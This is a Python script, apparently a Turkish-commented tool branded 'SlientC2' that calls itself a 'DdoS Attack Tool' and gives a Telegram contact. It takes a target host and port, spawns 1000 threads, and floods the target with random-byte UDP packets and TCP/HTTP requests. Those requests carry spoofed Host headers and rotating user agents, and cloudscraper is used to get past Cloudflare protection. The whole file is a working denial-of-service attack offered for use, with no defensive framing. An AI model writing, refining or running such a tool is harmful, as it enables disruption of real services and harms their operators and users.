#!/usr/bin/python3
import os
import time
import sys
import socket
import threading
import platform
import random
import struct

# Gerekli kütüphanelerin kontrolü ve otomatik yüklenmesi
try:
    import cloudscraper
    import requests
except ImportError:
    os.system("pip install cloudscraper requests")
    import cloudscraper
    import requests

try:
   from colorama import Fore, init
   init()
except ImportError:
    os.system("pip install colorama")
    from colorama import Fore, init
    init()
def prompt(text):
    print(Fore.WHITE + "┌──[SlientC2] - [SlientC2/root]")
    return input(Fore.WHITE + f"└─➤  ")
    
    
fake = ['192.165.6.6', '192.176.76.7', '192.156.6.6', '192.155.5.5', '192.143.2.2', '188.1421.41.4', '187.1222.12.1', '192.153.4.4', '192.154.32.4', '192.1535.53.25', '192.154.545.5', '192.143.43.4', '192.165.6.9', '188.1545.54.3']
global ua
ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']

# Satır bazlı akıcı mavi-mor geçiş fonksiyonu
def print_smooth_gradient(text):
    line_palette = [
    201,165,129,93,57,
    21,27,33,39,45,51,
    87,123,159,195,
    231,225,219,213
]
    lines = text.split("\n")
    for idx, line in enumerate(lines):
        color_code = line_palette[idx % len(line_palette)]
        print(f"\033[38;5;{color_code}m{line}\033[0m")

if os.name == "posix":
    os.system('clear')
elif os.name == "nt":
    os.system('cls')

logo = r"""
╔═══╦╗──╔══╦═══╦═╗─╔╦════╗
║╔═╗║║──╚╣╠╣╔══╣║╚╗║║╔╗╔╗║
║╚══╣║───║║║╚══╣╔╗╚╝╠╝║║╚╝
╚══╗║║─╔╗║║║╔══╣║╚╗║║─║║
║╚═╝║╚═╝╠╣╠╣╚══╣║─║║║─║║
╚═══╩═══╩══╩═══╩╝─╚═╝─╚╝

      DdoS Attack Tool
   telegram: t.me/Zeldyy_here
   
"""

padding = " " * 15  # bunu artırıp azaltabilirsin

logo = "\n".join(
    padding + line if line.strip() else line
    for line in logo.splitlines()
)

print_smooth_gradient(logo)

try:
    raw_input, port = prompt(
        "\033[1;37mIP or URL Target ve Port Gir (örnek: 1.1.1.1 80): "
    ).split()

    port = int(port)
    bost = ("Y").lower()
    
    # İstenen değerler otomatik olarak 1000'e sabitlendi
    bytes_val = 1000
    thrs = 1000
    
    if os.name == "posix":
        os.system('clear')
    elif os.name == "nt":
        os.system('cls')

    # === URL DESTEK MEKANİZMASI ===
    clean_host = raw_input.replace("http://", "").replace("https://", "")
    if "/" in clean_host:
        clean_host = clean_host.split("/")[0]
    target_host = clean_host

    if bost == 'y':
        bytes_val = bytes_val + 500
    else:
        bytes_val = bytes_val 
        
    print_smooth_gradient(logo)
    print(Fore.LIGHTWHITE_EX+"ATTACK STATUS: ")
    print("╔═════════════════")
    print(f"║ Target: {target_host}   ")
    print(f"║ Port  : {port} ")
    print(f"║ BPS   : {bytes_val}")
    print(f"║ Boost : {bost} ")
    print(f"║ Bot   : {bytes_val} ")
    print("╚═════════════════")

    # Domain IP adresine çözümleniyor
    try:
        ip = socket.gethostbyname(target_host)
    except socket.gaierror:
        print(Fore.LIGHTRED_EX+"[!] Fail get target info, did you type the target correct? [!]")
        sys.exit()

    def c2():
        for fk in fake:
            try:
                # 1. KISIM: UDP Akışı
                s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                byte_payload = random._urandom(1490)
                s1.sendto(byte_payload, (ip, port))
                for _ in range(bytes_val):
                    s1.sendto(byte_payload, (ip, port))
                    s1.sendto(byte_payload, (ip, port))
                s1.close()

                # 2. KISIM: Standart TCP / HTTP Akışı
                s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s2.settimeout(2)
                s2.connect((ip, port))
                s2.sendall(f"GET / HTTP/1.1\r\nHost: {fk}\r\nUser-Agent: {random.choice(ua)}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nConnection: Keep-Alive\r\n\r\n".encode("utf-8"))
                s2.close()

                # 3. KISIM: Cloudscraper HTTP İsteği
                scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
                try:
                    scraper.get(f"http://{ip}:{port}", timeout=2)
                except:
                    pass

                # 4. KISIM: Döngüsel UDP ve Alternatif İstekler
                udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(bytes_val):
                    udp.sendto(byte_payload, (ip, port))
                    req_msg = f"GET / HTTP/1.1\r\nHost: {fk}\r\nUser-Agent: {random.choice(ua)}\r\n\r\n".encode('utf-8')
                    udp.sendto(req_msg, (ip, port))
                udp.close()

            except (OSError, TypeError):
                continue
            except TimeoutError:
                print(Fore.LIGHTRED_EX+"\nTARGET RESPONSE TIMEOUT ! ")
            except Exception as e:
                pass

    # Otomatikleştirilmiş 1000 thread döngüsü başlatılıyor
    for i in range(thrs):
        threads = threading.Thread(target=c2)
        threads.daemon = True
        threads.start()

    # Programın arka planda aktif kalmasını sağlayan ana döngü
    while True:
        time.sleep(1)

except ValueError:
    print("\033[1;33mDid you fill the target info correctly? please retry!")
